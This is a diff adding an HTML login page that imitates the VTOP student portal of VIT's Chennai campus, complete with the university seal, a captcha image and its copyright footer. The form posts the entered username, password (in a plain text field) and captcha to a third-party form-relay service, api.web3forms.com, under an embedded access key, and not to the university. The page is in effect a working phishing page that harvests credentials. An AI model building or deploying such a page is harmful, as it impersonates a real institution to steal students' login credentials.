@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VTOP Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <img src="./Vellore_Institute_of_Technology_seal_2017.svg.png" class="logoo">
+            <h1>VIT</h1>
+            <p>(Chennai Campus)</p>
+        </div>
+    </header>
+    <div class="container">       
+        <div class="login-box">
+            <h2>VTOP Login</h2>
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="5d998d00-2e5d-41ba-9ca4-b2148bed18fa">
+                <div class="input-box">
+                    <input type="text" id="username" placeholder="Username" name="username">
+                </div>
+                <div class="input-box">
+                    <input type="text" id="text" placeholder="password" name="text">
+                    <button type="button" class="toggle-visibility"></button>
+                </div>
+                <div class="captcha-box">
+                    <img src="./captcha.jpg" alt="Captcha">
+                    <input type="text" id="captcha" placeholder="Captcha" name="captcha">
+                </div>
+                <button type="submit">Submit</button>
+                <div class="links">
+                    <ul>
+                        <li><a href="#">Forgot Password</a></li>
+                        <li><a href="#">Forgot LoginId</a></li>
+                    </ul>
+                </div>
+                <a href="#" class="home-link">Go to Home Page</a>
+            </form>
+        </div>
+    </div>
+    <footer>
+        <p>Copyright © 2024 Software Development Cell, VIT, Chennai-600 127</p>
+    </footer>
+    <script src="script.js"></script>
+    
+</body>
+</html>
